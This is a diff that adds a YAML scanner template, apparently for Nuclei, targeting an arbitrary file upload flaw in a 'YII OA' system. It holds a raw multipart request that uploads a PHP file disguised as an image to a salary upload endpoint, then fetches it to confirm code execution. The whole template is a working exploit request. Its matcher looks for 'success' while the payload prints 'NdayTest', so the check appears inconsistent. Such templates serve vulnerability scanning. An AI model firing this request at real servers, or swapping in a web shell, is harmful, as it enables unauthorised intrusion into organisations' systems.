@@ -1,0 +1,39 @@
+id: yii-oa-file-upload-1
+
+info:
+  name: YII OA 系统特定接口任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+      
+      YII OA 系统在文件处理逻辑中存在权限校验缺陷，攻击者可利用该漏洞通过特定接口上传任意文件至服务器，可能导致远程代码执行或敏感信息泄露。该漏洞影响范围涉及系统文件存储模块，需通过身份验证的上下文进行利用。
+  tags: YII
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /index.php/salary/record/upload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----------398jnjVTTlDVXHlE7yYnfwBoix
+
+    ------------398jnjVTTlDVXHlE7yYnfwBoix
+    Content-Disposition: form-data; name="file"; filename="NTest.php"
+    Content-Type: image/jpg
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------------398jnjVTTlDVXHlE7yYnfwBoix
+- raw:
+  - |
+    GET /upload/salary/template/import/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
